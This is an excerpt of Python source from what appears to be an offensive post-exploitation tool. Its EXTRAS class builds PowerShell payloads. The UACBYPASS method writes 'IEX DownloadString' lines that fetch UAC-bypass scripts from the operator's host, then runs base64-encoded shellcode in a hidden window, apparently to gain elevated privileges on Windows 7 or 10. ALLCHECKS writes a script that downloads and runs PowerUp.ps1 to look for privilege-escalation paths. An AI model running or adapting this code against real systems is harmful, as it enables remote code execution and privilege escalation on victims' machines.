...
class EXTRAS(object):
    def __init__(self, shellcode):
        ...
        self.injectshellcode_layout = powershellShellcodeLayout(self.shellcode).rstrip(',')
    ...
    def UACBYPASS(self, version):
        ...
        if version == "7":
            uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("http://%s:%s/Invoke-BypassUAC.ps1");\nInvoke-BypassUAC -Command \"powershell -enc %s\" """ % (returnIP(), moduleport, b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
            a = multiprocessing.Process(target=stagePowershellCode, args=(uacbypassfilecontent, randomPort))
            a.daemon = True
            a.start()
        elif version == "10":
            uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("http://%s:%s/Invoke-SilentCleanUpBypass.ps1");\nInvoke-SilentCleanUpBypass -Command \"cmd /c powershell -WindowStyle Hidden -enc %s && REM\" """ % (returnIP(), moduleport, b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
            a = multiprocessing.Process(target=stagePowershellCode, args=(uacbypassfilecontent, randomPort))
            a.daemon = True
            a.start()
    ...
    def ALLCHECKS(self):
        ...
        with open('allchecks.ps1', 'w') as allchecksfile:
            allchecksfile.write("""IEX (New-Object Net.WebClient).DownloadString("http://%s:%s/PowerUp.ps1");invoke-allchecks""" % (returnIP(), moduleport))
            allchecksfile.close()
            return self.shellcode
